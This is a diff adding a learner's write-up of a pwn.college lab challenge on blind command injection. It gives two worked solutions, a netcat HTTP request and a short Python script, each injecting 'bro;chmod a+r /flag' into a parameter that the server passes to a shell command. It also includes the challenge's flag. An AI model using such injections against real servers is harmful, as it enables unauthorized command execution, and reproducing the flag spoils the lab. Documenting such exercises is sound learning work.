@@ -1,0 +1,46 @@
+# challenge: CMDi 5
+
+📅 2026-01-22
+📁 web security
+
+---
+
+## ✅ what i did  
+I WAY -> netcat
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+found out the enpoint is /mission
+the server builds the command in the following way: touch {arg}
+but this time we dont receive the command's output, so the attack is blind
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /mission?full-path=bro;chmod%20a%2Br%20%2Fflag HTTP/1.1'
+        'Host: challenge.localhost'
+-flag popped out
+
+II WAY -> python
+-clicker start
+-opened the terminal
+-ran: 'vim bro'
+-typed: '#!/usr/bin/env python3'
+        'import requests'
+        'from pwn import *'
+        'context.log_level = 'error''
+        'p = process("/challenge/server")'
+        'time.sleep(1)'
+        'url = "http://challenge.localhost/mission"'
+        'params = {'
+                '"full-path" : "bro;chmod a+r /flag"'
+                '}'
+        'r = requests.get(url, params)'
+        'print(r.text)'
+-ran: 'chmod a+x bro'
+-ran: './bro'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+how to blindly hijack a command 
+
+## 🏁 Flag  
+pwn.college{8tHOBIdprG3zWpoi1fEegJ7Xoh8.QX3YTN2wCO4IDOxEzW}
